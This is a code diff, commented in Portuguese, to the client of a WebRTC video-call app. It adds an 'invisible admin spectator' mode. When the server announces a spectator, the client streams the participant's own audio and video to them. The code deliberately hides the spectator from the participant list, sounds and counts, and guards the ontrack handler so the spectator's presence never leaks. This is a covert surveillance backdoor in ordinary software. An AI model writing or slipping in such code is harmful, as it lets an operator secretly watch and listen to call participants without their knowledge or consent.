@@ -615,6 +615,14 @@ let currentQuality = null;
 const peers = new Map();
 // peerId -> nome, usado para a lista de participantes
 const peerNames = new Map();
+// ids de espectadores admin invisiveis (ver onSpectatorJoined/Left abaixo) -
+// o ontrack em createPeerConnection confere esse Set antes de criar
+// qualquer tile/audio pra nao vazar a presenca deles: mesmo com a direcao
+// da negociacao WebRTC correta (so o participante manda, o espectador so
+// recebe), o navegador pode disparar ontrack uma vez durante a renegociacao
+// (ex: colisao com a criacao do canal de chat) antes de estabilizar - essa
+// checagem garante que a UI nunca mostra nada mesmo nesse caso.
+const spectatorPeerIds = new Set();
 
 async function applyBitrateToSender(sender, quality) {
   if (!sender || !quality) return;
@@ -1271,6 +1279,7 @@ function createPeerConnection(peerId) {
   };
 
   pc.ontrack = (event) => {
+    if (spectatorPeerIds.has(peerId)) return;
     const name = peerNames.get(peerId) || 'Participante';
     const video = getOrCreateVideoTile(peerId, name);
     video.srcObject = event.streams[0];
@@ -2180,6 +2189,26 @@ btnJoin.addEventListener('click', async () => {
 
     window.rtc.onDisconnected(() => {
       setLoginError('Conexão com o servidor perdida.');
+    });
+
+    // Painel de admin: o dono do app pode entrar numa sala no modo
+    // espectador invisivel. O servidor avisa por esses dois eventos em vez
+    // de peer-joined/peer-left - de proposito NAO mexemos em nenhuma UI
+    // (sem linha de participante, sem som, sem contagem) pra continuar
+    // invisivel. createPeerConnection sozinho ja basta: como o espectador
+    // nunca manda midia de volta, nosso lado nunca recebe 'ontrack' dele e
+    // nenhuma tile de video chega a aparecer - so mandamos nosso audio/
+    // video pra ele, exatamente como pra qualquer outro peer.
+    window.rtc.onSpectatorJoined(({ id: peerId }) => {
+      spectatorPeerIds.add(peerId);
+      createPeerConnection(peerId);
+    });
+
+    window.rtc.onSpectatorLeft(({ id: peerId }) => {
+      const state = peers.get(peerId);
+      if (state) state.pc.close();
+      peers.delete(peerId);
+      spectatorPeerIds.delete(peerId);
     });
 
     roomLabel.textContent = roomId;
